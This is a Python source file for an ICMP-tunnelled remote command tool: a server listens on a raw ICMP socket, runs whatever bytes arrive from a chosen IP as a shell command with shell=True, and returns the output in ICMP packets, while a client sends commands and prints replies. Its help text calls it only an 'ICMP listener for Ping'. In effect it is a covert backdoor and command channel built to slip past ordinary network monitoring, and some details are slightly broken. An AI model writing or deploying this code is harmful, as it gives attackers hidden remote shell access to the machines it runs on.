import socket
import struct 
import subprocess
import string 
import random

ICMP_BUFFER_SIZE = 65565
SIGNAL_SUBSTRING = b'ENDOFREQUEST'
class Server():
    def __init__(self, src_ip, output_file):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except socket.error as e:
            raise
        self.sock = sock
        self.src_ip = src_ip
        self.output_file = output_file
    
    def listen(self):
        addr = [None]
        data = b''
        run = True

        while run:
            packet, addr = self.sock.recvfrom(1024)
            if addr[0] == self.src_ip:
                icmp_data = ICMP.parse_packet(packet)
                if SIGNAL_SUBSTRING in icmp_data:
                    run = False
                data += icmp_data
        result_string = data.replace(SIGNAL_SUBSTRING, b"")
        return result_string
    
    def send(self, data:bytes):
        packet_id = random.randint(0,65535)
        packet = ICMP.create_packet(packet_id, data)

        while packet:
            sent = self.sock.sendto(packet, (self.src_ip, 1))
            packet = packet[sent:]

    def write_output(self, data):
        print(f"Received data: {data}")

    def main_func(self):
        data = self.listen()
        self.write_output(data)

        p = Payload(data, out)
        output = p.exec_payload()
        self.send(output)

class Client():
    def __init__(self, dst_ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except socket.error as e:
            raise
        self.sock = sock
        self.dst_ip = dst_ip

    def send(self, data:bytes):
        packet_id = random.randint(0,65535)
        packet = ICMP.create_packet(packet_id, data)

        while packet:
            sent = self.sock.sendto(packet, (self.dst_ip, 1))
            packet = packet[sent:]

    def listen(self):
        addr = [None]
        data = b''
        run = True
        
        while run:
            packet, addr = self.sock.recvfrom(1024)
            if addr[0] == self.dst_ip:
                icmp_data = ICMP.parse_packet(packet)
                if SIGNAL_SUBSTRING in icmp_data:
                    run = False
                data += icmp_data
                print(f"[+] Received data from {addr[0]}: {icmp_data}")
        result_string = data.replace(SIGNAL_SUBSTRING, b"")
        return result_string

    def main_func(self, data):
        self.send(str.encode(data))
        data = self.listen()
        encoding = 'utf-8'
        print(f"Received data: {str(data, encoding)}")

class ICMP():
    def __init__(self, src_ip):
        pass

    @staticmethod
    def checksum(source_string):
        sum = 0
        count_to = (int(len(source_string) / 2)) * 2

        count = 0
        while count < count_to:
            this_val = source_string[count + 1]*256+source_string[count]
            sum = sum + this_val
            sum = sum & 0xffffffff
            count = count + 2
        if count_to < len(source_string):
            sum = sum + source_string[len(source_string) - 1]
            sum = sum & 0xffffffff
        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff
        answer = answer >> 8 | (answer << 8 & 0xff00)
        return answer
    
    @staticmethod
    def create_packet(id, data:bytes):
        ICMP_ECHO_REQUEST=0
        data = data + SIGNAL_SUBSTRING
        header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)
        my_checksum = ICMP.checksum(header + data)
        header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)
        return header + data
    
    @staticmethod
    def parse_packet(packet):
        icmp_header = packet[20:28]
        icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack("bbHHh", icmp_header)
        icmp_data = packet[28:]#[16:32]
        return icmp_data

class Payload():
    def __init__(self, payload, output_file):
        self.payload = payload
        self.output_file = output_file

    def exec_payload(self):
        p = subprocess.Popen(self.payload, shell=True, stdout = subprocess.PIPE)
        try:
            outs, errs = p.communicate(timeout=15)
        except TimeoutExpired:
            p.kill()
            outs, errs = p.communicate()

        #debug
        f = open(self.output_file, "w")
        encoding = 'utf-8'
        f.write(outs.decode(encoding))
        f.close()

        return outs
   

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='ICMP listener for Ping')
    parser.add_argument('-o', '--output', default='output.txt', type=str, help='Output file')
    parser.add_argument('-s', '--src-ip', type=str, help='Source IP of ICMP sender')
    parser.add_argument('-d', '--dst-ip', type=str, help='Destination IP of ICMP recipient')
    parser.add_argument('-c', '--command', type=str, help='Command to execute')
    args = parser.parse_args()

    if args.src_ip is not None:
        src_ip = args.src_ip
        out = args.output
        run = Server(src_ip, out)
        run.main_func()
    elif args.dst_ip is not None and args.command is not None:
        dst_ip = args.dst_ip
        command = args.command
        run = Client(dst_ip)
        run.main_func(command)
    else:
        print("Enter proper values")

    